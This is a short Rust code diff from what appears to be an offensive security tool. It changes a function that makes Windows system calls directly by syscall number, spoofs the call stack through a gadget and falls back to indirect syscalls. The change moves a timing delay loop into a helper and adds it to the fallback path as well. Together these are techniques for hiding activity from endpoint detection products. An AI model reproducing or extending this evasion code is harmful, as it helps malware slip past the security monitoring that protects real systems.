@@ -303,8 +303,7 @@ pub unsafe fn direct_invoke_with_spoof(data: &SyscallData, args: &[usize]) -> us
             "Invoking spoofed syscall: SSN={:#x}, Inst={:#x}, Gadget={:#x}, Offset={:#x}",
             data.ssn, data.syscall_inst, ctx.gadget, ctx.gadget_offset
         ));
-        #[cfg(not(feature = "debug"))]
-        for _ in 0..1000000 { core::hint::spin_loop(); }
+        crate::utils::delay_loop();
         let result = spoofed_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len(), &ctx);
         #[cfg(feature = "debug")]
         crate::utils::print_message(&format!("Spoofed syscall completed, result: {:#x}", result));
@@ -312,6 +311,7 @@ pub unsafe fn direct_invoke_with_spoof(data: &SyscallData, args: &[usize]) -> us
     } else {
         #[cfg(feature = "debug")]
         crate::utils::print_message("Spoof context unavailable, falling back to direct indirect-syscall");
+        crate::utils::delay_loop();
         let result = direct_syscall_bridge(data.ssn, data.syscall_inst, args.as_ptr(), args.len());
         result
     }
